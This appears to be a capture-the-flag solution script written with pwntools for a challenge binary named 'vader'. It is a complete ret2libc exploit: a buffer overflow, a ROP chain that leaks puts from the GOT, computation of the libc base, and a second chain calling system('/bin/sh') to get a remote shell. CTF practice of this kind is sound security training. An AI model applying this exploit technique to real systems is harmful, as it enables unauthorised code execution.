from pwn import *

local = 0
if local == 1:
	target = process('./vader')

	pid = gdb.attach(target, "\nb *main+68\n set disassembly-flavor intel\ncontinue")
    #If you want to test this locally, you can insert a line of
    #libc = ELF(insert location of libc.so file used locally here)
else:
	target = remote('0.cloud.chals.io', 20712)
	libc = ELF('libc6_2.33-3_amd64.so')
    
elf = ELF('vader')

pop_rdi = 0x000000000040165b	
pop_rsi_r15 = 0x0000000000401659
pop_rcx_rdx = 0x00000000004011cd
pop_r8 = 0x00000000004011d9
pop_rdx = 0x00000000004011ce


print(target.recvuntil(b'Now I am the master >>>'))
payload = cyclic(200)
padding = b'a' * 40
payload = padding
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.symbols['puts'])
payload += p64(elf.symbols['main'])

target.sendline(payload)

leak = target.recvuntil(b'MMMMMMMMMMMMMMM').strip(b'\nMMMMMMMMMMMMMMM')[1:]
print(leak)
puts_libc = u64(leak+ b'\x00' * 2)


print(target.recvuntil(b'Now I am the master >>>'))
print(hex(puts_libc))

libc_base = puts_libc - libc.symbols['puts']
system_libc = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = padding
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi_r15)
payload += p64(0) * 2
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(system_libc)
target.sendline(payload)

target.interactive()

target.interactive()